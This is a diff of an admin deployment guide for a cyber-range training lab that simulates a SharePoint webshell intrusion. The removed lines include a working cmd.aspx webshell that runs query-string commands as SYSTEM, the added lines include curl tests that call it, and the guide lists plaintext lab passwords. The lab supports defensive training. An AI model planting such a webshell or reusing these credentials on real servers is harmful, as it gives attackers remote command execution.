@@ -1,17 +1,17 @@
-# Admin Deployment Guide — OpenRaptor Cyber Range
+# Admin Deployment Guide - OpenRaptor Cyber Range
 
 This guide is for administrators deploying the OpenRaptor Cyber Range in a new Azure tenant.
 
 > ## 🚀 Lab deployed by OD@CIRT.APAC?
 >
-> If OD@CIRT.APAC has deployed and handed over this lab environment to you, **your lab is ready — no setup required.**
+> If OD@CIRT.APAC has deployed and handed over this lab environment to you, **your lab is ready - no setup required.**
 >
 > | Role | Go to |
 > |------|-------|
-> | 🧑‍💼 **Tenant Admin** | Jump to [Lab Administration — Per-Module Scripts](#lab-administration--per-module-scripts) — everything is pre-deployed, just run and reset modules |
-> | 🎓 **Student** | [Student Lab Guide](lab-guide/01-sharepoint-webshell.md) — start your training directly |
+> | 🧑‍💼 **Tenant Admin** | Jump to [Lab Administration - Per-Module Scripts](#lab-administration--per-module-scripts) - everything is pre-deployed, just run and reset modules |
+> | 🎓 **Student** | [Student Lab Guide](lab-guide/01-sharepoint-webshell.md) - start your training directly |
 >
-> ⬇️ **Steps 1–8 below** are only needed if you are self-hosting and deploying the lab from scratch in your own Azure subscription.
+> ⬇️ **Steps 1-8 below** are only needed if you are self-hosting and deploying the lab from scratch in your own Azure subscription.
 
 ---
 
@@ -31,9 +31,9 @@ This guide is for administrators deploying the OpenRaptor Cyber Range in a new A
 - Git
 
 ### Licensing Requirements
-- **Entra ID P1** (minimum) — for conditional access and risk-based sign-in logs
-- **Microsoft 365 E3 or SharePoint Online Plan 2** — for SharePoint and unified audit log
-- **MDE** — optional. If available, Microsoft Defender for Endpoint provides device-level telemetry and timeline analysis. Not required for core labs
+- **Entra ID P1** (minimum) - for conditional access and risk-based sign-in logs
+- **Microsoft 365 E3 or SharePoint Online Plan 2** - for SharePoint and unified audit log
+- **MDE** - optional. If available, Microsoft Defender for Endpoint provides device-level telemetry and timeline analysis. Not required for core labs
 
 ---
 
@@ -47,15 +47,15 @@ This guide is for administrators deploying the OpenRaptor Cyber Range in a new A
 |-------|-----------|----------|-------|
 | Domain Admin | `NORCA\cirtadmin`, `NORCA\Administrator` | `CirtApacAdm!n2026` | Do not share with students |
 | Student login | `NORCA\cirtstudent`, `cirtstudent@norca.click` | `CirtApacStudent2026` | Lab login for students |
-| Scenario character | `NORCA\j.chen` | `CirtApacStudent2026` | Finance Analyst — compromised in scenario |
-| **Service account** | `NORCA\svc-sp-farm` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
-| **Service account** | `NORCA\svc-sp-app` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
+| Scenario character | `NORCA\j.chen` | `CirtApacStudent2026` | Finance Analyst - compromised in scenario |
+| **Service account** | `NORCA\svc-sp-farm` | **`Norca@2024!`** | **Baked in golden image - do not rotate** |
+| **Service account** | `NORCA\svc-sp-app` | **`Norca@2024!`** | **Baked in golden image - do not rotate** |
 | Handover encryption | _(7-Zip archive)_ | `CirtAPACR@ptor` | Standard handover zip password |
 
-> ⚠️ Service accounts (`svc-sp-farm`, `svc-sp-app`) must use `Norca@2024!` — this is baked into the SP01 golden image. Using any other password will cause SharePoint services to fail on startup.
+> ⚠️ Service accounts (`svc-sp-farm`, `svc-sp-app`) must use `Norca@2024!` - this is baked into the SP01 golden image. Using any other password will cause SharePoint services to fail on startup.
 
 
-## Step 1 — Create a Service Principal
+## Step 1 - Create a Service Principal
 
 ```bash
 # Login to Azure
@@ -71,7 +71,7 @@ az ad sp create-for-rbac \
   --scopes /subscriptions/<YOUR_SUBSCRIPTION_ID>
 ```
 
-Save the output — you'll need it in Step 3:
+Save the output - you'll need it in Step 3:
 ```json
 {
   "appId":       "YOUR_CLIENT_ID",
@@ -84,7 +84,7 @@ Save the output — you'll need it in Step 3:
 
 ---
 
-## Step 2 — Clone the Repo
+## Step 2 - Clone the Repo
 
 ```bash
 git clone https://github.com/<your-org>/OpenRaptor.git
@@ -93,7 +93,7 @@ cd OpenRaptor
 
 ---
 
-## Step 3 — Configure Deployment Variables
+## Step 3 - Configure Deployment Variables
 
 Copy the example vars file and fill in your values:
 
@@ -117,13 +117,13 @@ rg_identity = "rg-cirtlab-identity"
 
 # VM admin credentials
 admin_username = "cirtadmin"
-# admin_password set via environment variable — see below
+# admin_password set via environment variable - see below
 
-# Golden image IDs — Community Gallery (provided by OD@CIRT.APAC out-of-band)
+# Golden image IDs - Community Gallery (provided by OD@CIRT.APAC out-of-band)
 sp01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/sp01-module01-student/Versions/1.0.0"
 dc01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/dc01-base-specialized/Versions/1.0.0"
 
-# Kali post-deploy setup script (pull from OpenRaptor — public)
+# Kali post-deploy setup script (pull from OpenRaptor - public)
 kali_setup_script_url = "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scenarios/module-01-webshell/admin/kali_01_setup.sh"
 
 # Infrastructure
@@ -158,7 +158,7 @@ $env:TF_VAR_admin_password = "CirtApacAdm!n2026"
 
 ---
 
-## Step 4 — Authenticate to Azure
+## Step 4 - Authenticate to Azure
 
 Login with the service principal created in Step 1:
 
@@ -187,7 +187,7 @@ az account set --subscription "<YOUR_SUBSCRIPTION_ID>"
 
 ---
 
-## Step 5 — Deploy Infrastructure (Terraform)
+## Step 5 - Deploy Infrastructure (Terraform)
 
 All infrastructure is deployed from the single `infra-tf/` directory. One `terraform apply` creates everything: networking, VMs, Bastion, Log Analytics, DNS, and policy.
 
@@ -197,10 +197,10 @@ cd infra-tf
 # Initialise (downloads providers: azurerm ~>4.0, azapi ~>2.0)
 terraform init
 
-# Preview — review carefully before applying
+# Preview - review carefully before applying
 terraform plan -out=tfplan
 
-# Apply — takes approximately 10–20 minutes
+# Apply - takes approximately 10-20 minutes
 terraform apply tfplan
 ```
 
@@ -218,22 +218,22 @@ Resources created:
 | `policy` | Tag policy (audit mode) |
 | `scripts-storage` | Storage account for lab scripts |
 
-> ⏳ VM provisioning from golden images takes **5–10 minutes** per VM. Total deployment: **15–25 minutes**.
+> ⏳ VM provisioning from golden images takes **5-10 minutes** per VM. Total deployment: **15-25 minutes**.
 
 ### Golden Images
 
 | Image | VM | Source | Description |
 |-------|-----|--------|-------------|
-| `dc01-base-specialized` | DC01 | Community Gallery | Windows Server — AD DS, DNS, `norca.click` domain pre-configured |
-| `sp01-module01-student` | SP01 | Community Gallery | SharePoint 2019 — **clean (noWS)**. Use for Module 01 student path |
-| `sp01-module01` | SP01 | Community Gallery | SharePoint 2019 — **webShelled**. Reserved for future walk-in-compromised scenarios |
-| _(Marketplace)_ | Kali01 | Azure Marketplace `kali-linux:kali:kali-2025-4` | Kali Linux — Marketplace terms prevent Community Gallery distribution |
+| `dc01-base-specialized` | DC01 | Community Gallery | Windows Server - AD DS, DNS, `norca.click` domain pre-configured |
+| `sp01-module01-student` | SP01 | Community Gallery | SharePoint 2019 - **clean (noWS)**. Use for Module 01 student path |
+| `sp01-module01` | SP01 | Community Gallery | SharePoint 2019 - **webShelled**. Reserved for future walk-in-compromised scenarios |
+| _(Marketplace)_ | Kali01 | Azure Marketplace `kali-linux:kali:kali-2025-4` | Kali Linux - Marketplace terms prevent Community Gallery distribution |
 
 > 📌 Community Gallery name (`<COMMUNITY_GALLERY_NAME>`) is provided by OD@CIRT.APAC directly to authorised deployers. It is not published in this repo.
 
 ---
 
-## Step 5 (Alternative) — Manual Deployment via `az vm create`
+## Step 5 (Alternative) - Manual Deployment via `az vm create`
 
 If you prefer not to use Terraform, or need to redeploy individual VMs, use `az vm create` directly.
 
@@ -271,7 +271,7 @@ az vm create `
   --location australiaeast
 ```
 
-### SP01 (Module 01 — noWS image)
+### SP01 (Module 01 - noWS image)
 
 ```bash
 # Bash
@@ -343,14 +343,14 @@ az vm create `
 
 ---
 
-## Step 6 — Post-Deploy: SharePoint Service Accounts
+## Step 6 - Post-Deploy: SharePoint Service Accounts
 
 After DC01 and SP01 are running, verify SharePoint services start correctly. The golden image has `svc-sp-farm` and `svc-sp-app` baked with password `Norca@2024!`.
 
 Connect to SP01 via Bastion and run:
 
 ```powershell
-# On SP01 — verify SharePoint services are running
+# On SP01 - verify SharePoint services are running
 Get-Service | Where-Object { $_.Name -like "SP*" } | Select Name, Status
 
 # If services are stopped, reset service account credentials:
@@ -361,16 +361,16 @@ sc.exe config SPAdminV4  obj= "NORCA\svc-sp-farm" password= $svcPass
 net start SPTimerV4
 ```
 
-> ⚠️ **`svc-sp-farm` and `svc-sp-app` passwords are permanently `Norca@2024!`** — baked into the golden image. Do not change or rotate these. See [Credential Reference](#credential-reference-canonical).
+> ⚠️ **`svc-sp-farm` and `svc-sp-app` passwords are permanently `Norca@2024!`** - baked into the golden image. Do not change or rotate these. See [Credential Reference](#credential-reference-canonical).
 
 ---
 
-## Step 7 — Lab Module Setup
+## Step 7 - Lab Module Setup
 
 After all VMs are running, stage the scenario toolkit for Module 01. Run this from DC01:
 
 ```powershell
-# On DC01 — stage Module 01 toolkit
+# On DC01 - stage Module 01 toolkit
 # Downloads from OpenRaptor, stages on Kali01, seeds j.chen account
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scripts/lab_01_setup.ps1" -OutFile "C:\lab_01_setup.ps1"
 .\lab_01_setup.ps1
@@ -379,7 +379,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-org>/OpenRaptor/
 Expected output:
 ```
 [OK] DC01 reachable
-[OK] SP01 reachable — HTTP 200 on http://sharepoint.norca.click
+[OK] SP01 reachable - HTTP 200 on http://sharepoint.norca.click
 [OK] j.chen account created (or already exists)
 [OK] Kali01 toolkit staged at /opt/raptor/lab-01/
 [OK] SP01 in clean state (no webshell present)
@@ -390,12 +390,12 @@ Expected output:
 
 ---
 
-## Step 8 — Configure Student Access
+## Step 8 - Configure Student Access
 
 ### Create Student Account
 
 ```bash
-# Azure CLI — create cirtstudent in on-prem AD via DC01 (Bastion session on DC01)
+# Azure CLI - create cirtstudent in on-prem AD via DC01 (Bastion session on DC01)
 New-ADUser -Name "cirtstudent" `
   -UserPrincipalName "cirtstudent@norca.click" `
   -AccountPassword (ConvertTo-SecureString "CirtApacStudent2026" -AsPlainText -Force) `
@@ -421,7 +421,7 @@ az role assignment create `
 
 ### Share Bastion Access
 
-Students connect via Azure Bastion — no public IPs, no VPN required:
+Students connect via Azure Bastion - no public IPs, no VPN required:
 
 1. Azure Portal → Resource Group `rg-cirtlab-core`
 2. Select `win-norca-sp01` → **Connect** → **Bastion**
@@ -442,7 +442,7 @@ Students connect via Azure Bastion — no public IPs, no VPN required:
 | Log Analytics (5GB/day) | ~$15 |
 | **Total** | **~$275/month** |
 
-> Costs vary by region and usage. Bastion is the biggest cost driver — consider [Bastion Developer SKU](https://learn.microsoft.com/azure/bastion/quickstart-developer) to reduce costs.
+> Costs vary by region and usage. Bastion is the biggest cost driver - consider [Bastion Developer SKU](https://learn.microsoft.com/azure/bastion/quickstart-developer) to reduce costs.
 
 ### Auto-Shutdown
 All VMs are configured to shut down at `19:00 UTC` daily. Override in `terraform.tfvars`.
@@ -458,7 +458,7 @@ terraform destroy -auto-approve
 terraform destroy -auto-approve
 ```
 
-> ⚠️ This destroys **all** lab resources — VMs, networking, Bastion, Log Analytics. Golden images in the Community Gallery are **not** deleted (they live in the source subscription). You can redeploy at any time.
+> ⚠️ This destroys **all** lab resources - VMs, networking, Bastion, Log Analytics. Golden images in the Community Gallery are **not** deleted (they live in the source subscription). You can redeploy at any time.
 
 ---
 
@@ -488,50 +488,86 @@ $cred = Get-Credential  # DOMAIN\cirtadmin
 Add-Computer -DomainName "{{DOMAIN}}" -Credential $cred -Force -Restart
 ```
 
-### ShellSite (port 8080) returns 500.19 or connection refused
-The lab setup script creates a **local IIS site** (`ShellSite`) on port **8080** with a minimal `cmd.aspx` webshell in `C:\inetpub\shell`. This is **admin-only** and used to validate local command execution during lab setup.
+### ShellSite (port 8080) — Troubleshooting Matrix
 
-If you hit **HTTP 500.19** (`0x80070003`) or can’t connect:
+`ShellSite` is the Module 01 scenario artefact — an IIS site on port 8080 serving `cmd.aspx`. It runs as `NT AUTHORITY\SYSTEM` (LocalSystem app pool — lab-only, intentional). The table below covers every failure mode observed in production.
+
+#### Step 1 — Validate current state (run on SP01 as admin)
 
 ```powershell
-# Recreate folder + minimal web.config
-New-Item -ItemType Directory -Force -Path C:\inetpub\shell | Out-Null
-@"<?xml version="1.0" encoding="UTF-8"?>
+# 1. Port listener
+netstat -ano | findstr ":8080"
+# Expected: TCP  0.0.0.0:8080  LISTENING  and  TCP  [::]:8080  LISTENING
+
+# 2. IIS config (use appcmd — NOT Get-WebSite, which may read wrong config)
+C:\Windows\System32\inetsrv\appcmd.exe list site "ShellSite"
+C:\Windows\System32\inetsrv\appcmd.exe list apppool "ShellPool"
+# Expected: state:Started for both
+
+# 3. TCP reachability
+Test-NetConnection -ComputerName localhost -Port 8080
+# Expected: TcpTestSucceeded : True
+
+# 4. Functional test
+curl.exe "http://localhost:8080/cmd.aspx?cmd=whoami"
+# Expected: nt authority\system
+```
+
+#### Step 2 — Symptom → Cause → Fix
+
+| Symptom | Cause | Fix |
+|---------|-------|-----|
+| `curl: (7) Failed to connect` / `TcpTestSucceeded: False` | ShellSite not in IIS config, or site/pool stopped | Run `sp01-webshell-setup.ps1` (see below) |
+| `netstat` shows `:8080 LISTENING` but `TcpTestSucceeded: False` | HTTP.sys registered but no w3wp spawned; pool crash loop | `appcmd start apppool ShellPool` then `iisreset` |
+| **HTTP 500.19 — `0x80070003`** | `C:\inetpub\shell\web.config` missing or unreadable | Recreate `web.config` (see below) |
+| HTTP 500.19 — `0x8007000d` | `web.config` XML is malformed | Recreate `web.config` with correct content |
+| HTTP 403 / 401 | ACL on `C:\inetpub\shell\` blocks IIS identity | `icacls C:\inetpub\shell /grant "IIS_IUSRS:(OI)(CI)(RX)" /T` |
+| HTTP 200 but blank output | `cmd.aspx` is empty or truncated | Redeploy `cmd.aspx` (see below) |
+| ShellSite visible in appcmd but not `Get-WebSite` | PowerShell WebAdministration read wrong (SysWOW64) config | Use `appcmd.exe` only — see WOW64 note below |
+
+#### Fix A — Full rebuild (recommended, idempotent)
+
+Run directly on SP01 in an **elevated PowerShell** session (RDP):
+
+```powershell
+# Option 1: Use the Woodpecker script (WebAdministration — only safe when run directly on SP01, not via run-command)
+powershell -ExecutionPolicy Bypass -File ".\scripts\deploy-shellsite.ps1"
+
+# Option 2: Use Shrike's appcmd script (safe via run-command AND direct)
+powershell -ExecutionPolicy Bypass -File ".\scenarios\module-01-webshell\admin\sp01-webshell-setup.ps1"
+```
+
+Both scripts are idempotent — safe to run on an already-configured machine.
+
+#### Fix B — Quick web.config recreate (500.19 only)
+
+```powershell
+@'
+<?xml version="1.0" encoding="UTF-8"?>
 <configuration>
-  <system.webServer>
-    <staticContent/>
-  </system.webServer>
+  <system.web>
+    <compilation debug="true" targetFramework="4.0" />
+    <httpRuntime targetFramework="4.0" />
+  </system.web>
 </configuration>
-"@ | Out-File -FilePath "C:\inetpub\shell\web.config" -Encoding UTF8
-
-# Recreate cmd.aspx
-@"<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<%
-string cmd = Request.QueryString["cmd"];
-Process p = new Process();
-p.StartInfo.FileName = "cmd.exe";
-p.StartInfo.Arguments = "/c " + cmd;
-p.StartInfo.UseShellExecute = false;
-p.StartInfo.RedirectStandardOutput = true;
-p.Start();
-Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
-%>
-"@ | Out-File -FilePath "C:\inetpub\shell\cmd.aspx" -Encoding UTF8
-
-# Ensure IIS site + app pool
-$appcmd = "$env:windir\System32\inetsrv\appcmd.exe"
-& $appcmd add apppool /name:"ShellPool" /managedRuntimeVersion:"v4.0" /processModel.identityType:LocalSystem /startMode:AlwaysRunning
-& $appcmd add site /name:"ShellSite" /bindings:"http/*:8080:" /physicalPath:"C:\inetpub\shell"
-& $appcmd set app "ShellSite/" /applicationPool:"ShellPool"
-& $appcmd start site "ShellSite"
+'@ | Set-Content -Path "C:\inetpub\shell\web.config" -Encoding UTF8
 ```
 
-Verify:
-```powershell
-curl.exe http://localhost:8080/cmd.aspx?cmd=whoami
+Then verify: `curl.exe http://localhost:8080/cmd.aspx?cmd=whoami`
+
+#### ⚠️ WOW64 config mismatch — critical note for remote automation
+
+`az vm run-command` spawns a **32-bit WOW64 PowerShell process**. `Import-Module WebAdministration` in that context writes to:
 ```
-Expected output: `nt authority\\system`.
+C:\Windows\SysWOW64\inetsrv\config\applicationHost.config
+```
+IIS reads from:
+```
+C:\Windows\System32\inetsrv\config\applicationHost.config
+```
+These are **different files**. Sites created via WebAdministration in a run-command context are invisible to IIS and to interactive sessions.
+
+**Rule:** When automating IIS config remotely via `az run-command`, always use `C:\Windows\System32\inetsrv\appcmd.exe` directly. `sp01-webshell-setup.ps1` follows this rule. `deploy-shellsite.ps1` uses WebAdministration and must only be run via RDP (direct session on SP01).
 
 ### Log Analytics not receiving data
 - Check VM extensions are installed: Portal → VM → Extensions
@@ -547,7 +583,7 @@ Expected output: `nt authority\\system`.
 
 ---
 
-## Lab Administration — Per-Module Scripts
+## Lab Administration - Per-Module Scripts
 
 Every module ships **three admin scripts** (run from DC01) and **one student script** (run from Kali01).
 
@@ -564,7 +600,7 @@ Every module ships **three admin scripts** (run from DC01) and **one student scr
 
 ---
 
-### Module 01 — SharePoint Webshell (`lab_01_sp_webshell`)
+### Module 01 - SharePoint Webshell (`lab_01_sp_webshell`)
 
 **Before first student (or after new deployment):**
 ```powershell
@@ -573,11 +609,11 @@ Every module ships **three admin scripts** (run from DC01) and **one student scr
 ```
 Creates j.chen account, deploys webshell IIS site on SP01, stages toolkit on Kali.
 
-> ⚠️ **IIS setup uses appcmd.exe — do NOT use `Import-Module WebAdministration` via `az run-command`.**
+> ⚠️ **IIS setup uses appcmd.exe - do NOT use `Import-Module WebAdministration` via `az run-command`.**
 > `az vm run-command` spawns a 32-bit WOW64 PowerShell process. WebAdministration cmdlets in that context
-> write to `C:\Windows\SysWOW64\inetsrv\config\applicationHost.config` — **not** the real IIS config at
+> write to `C:\Windows\SysWOW64\inetsrv\config\applicationHost.config` - **not** the real IIS config at
 > `System32\inetsrv\config\`. IIS never reads the WOW64 copy, so the site/pool never appears.
-> `lab_01_setup.ps1` calls `sp01-webshell-setup.ps1` which uses `appcmd.exe` directly — this always
+> `lab_01_setup.ps1` calls `sp01-webshell-setup.ps1` which uses `appcmd.exe` directly - this always
 > writes to the correct config. If you need to rebuild the webshell site manually, run
 > `sp01-webshell-setup.ps1` directly on SP01 (RDP or appcmd via run-command).
 
@@ -601,12 +637,12 @@ All checks must pass (exit 0) before student proceeds.
 
 ---
 
-### Golden Image Reference — SP01
+### Golden Image Reference - SP01
 
 | Image | Use case |
 |-------|----------|
-| `sp01-module01-student` | **noWS — Module 01 default.** Student drops webshell themselves from Kali. |
-| `sp01-module01` | **webShelled — future modules.** Investigation starts from already-compromised state. |
+| `sp01-module01-student` | **noWS - Module 01 default.** Student drops webshell themselves from Kali. |
+| `sp01-module01` | **webShelled - future modules.** Investigation starts from already-compromised state. |
 
 > The reset script for Module 01 always rebuilds from `sp01-module01-student`. Never substitute the webShelled image for the student path.
 
@@ -635,7 +671,7 @@ Each admin set must:
 
 ---
 
-## Recovery Plan — Unrecoverable VMs
+## Recovery Plan - Unrecoverable VMs
 
 Use this plan if a VM crashes and cannot be recovered by a normal restart.
 
@@ -643,14 +679,14 @@ Use this plan if a VM crashes and cannot be recovered by a normal restart.
 
 | VM | Rebuild Trigger | Impact if Down |
 |---|---|---|
-| SP01 | Student reset OR unrecoverable crash | Scenario unavailable — rebuild is normal ops |
-| DC01 | Only if unrecoverable (AD corruption, OS failure) | All VMs lose domain auth — lab fully down |
+| SP01 | Student reset OR unrecoverable crash | Scenario unavailable - rebuild is normal ops |
+| DC01 | Only if unrecoverable (AD corruption, OS failure) | All VMs lose domain auth - lab fully down |
 | Kali | Only if unrecoverable | Attack simulation unavailable only |
 | Base infra | Extreme case only | Full lab destruction |
 
 ---
 
-### SP01 — Rebuild (Normal)
+### SP01 - Rebuild (Normal)
 
 SP01 is designed to be rebuilt. This is the standard student reset flow.
 
@@ -667,11 +703,11 @@ terraform apply -target module.sp01 -auto-approve
 
 ---
 
-### DC01 — Emergency Rebuild
+### DC01 - Emergency Rebuild
 
 > ⚠️ Rebuilding DC01 destroys Active Directory. All domain-joined VMs (SP01, Kali) will lose domain membership and need to be rebuilt too.
 
-**Step 1 — Attempt recovery first:**
+**Step 1 - Attempt recovery first:**
 ```bash
 # Try a restart
 az vm restart -g <YOUR_RESOURCE_GROUP> -n dc01
@@ -682,7 +718,7 @@ az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
   --scripts "Get-Service NTDS,DNS,Netlogon | Select Name,Status"
 ```
 
-**Step 2 — If unrecoverable, full rebuild:**
+**Step 2 - If unrecoverable, full rebuild:**
 ```bash
 cd infra
 
@@ -698,7 +734,7 @@ sleep 600
 terraform apply -target module.sp01 -auto-approve
 ```
 
-**Step 3 — Verify AD DS:**
+**Step 3 - Verify AD DS:**
 ```bash
 az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
   --command-id RunPowerShellScript \
@@ -711,9 +747,9 @@ Get-ADUser -Filter * | Measure-Object | Select Count
 
 ---
 
-### Kali — Emergency Rebuild
+### Kali - Emergency Rebuild
 
-Kali is deployed from **Azure Marketplace** (not Community Gallery — Marketplace terms prevent redistribution). Rebuild is safe at any time — no persistent state.
+Kali is deployed from **Azure Marketplace** (not Community Gallery - Marketplace terms prevent redistribution). Rebuild is safe at any time - no persistent state.
 
 ```bash
 # Delete the existing Kali VM
@@ -736,7 +772,7 @@ az vm create \
   --location <YOUR_REGION>
 ```
 
-> After rebuild, run `lab_NN_setup.ps1` for the active module — this re-stages the module toolkit from OpenRaptor to `/opt/raptor/lab-NN/`.
+> After rebuild, run `lab_NN_setup.ps1` for the active module - this re-stages the module toolkit from OpenRaptor to `/opt/raptor/lab-NN/`.
 
 **Kali post-deploy setup (automated via `lab_NN_setup.ps1`):**
 - Installs: `curl`, `nmap`, `impacket`, `crackmapexec`, `evil-winrm`, `responder`
@@ -756,15 +792,15 @@ terraform destroy -auto-approve
 terraform apply -auto-approve
 ```
 
-Full rebuild: ~45–60 minutes.
+Full rebuild: ~45-60 minutes.
 
 ---
 
 ### Post-Rebuild Checklist
 
-- [ ] DC01 — AD DS, DNS, Netlogon services running
-- [ ] SP01 — domain joined, HTTP 200, all SP services running
-- [ ] Kali (if rebuilt) — tools present, network connectivity
+- [ ] DC01 - AD DS, DNS, Netlogon services running
+- [ ] SP01 - domain joined, HTTP 200, all SP services running
+- [ ] Kali (if rebuilt) - tools present, network connectivity
 - [ ] LAW receiving heartbeats from all VMs
 - [ ] Run `./scripts/reset-lab.sh` smoke test passes
 
@@ -772,9 +808,9 @@ Full rebuild: ~45–60 minutes.
 
 ## Security Notes
 
-- No VMs have public IP addresses — all access via Bastion only
+- No VMs have public IP addresses - all access via Bastion only
 - Azure Policy denies public IP creation in `<YOUR_RESOURCE_GROUP>`
-- All simulations are **benign** — no real malware, no live exploits
+- All simulations are **benign** - no real malware, no live exploits
 - Do not connect this lab to production systems
 - Rotate admin credentials after initial setup
 
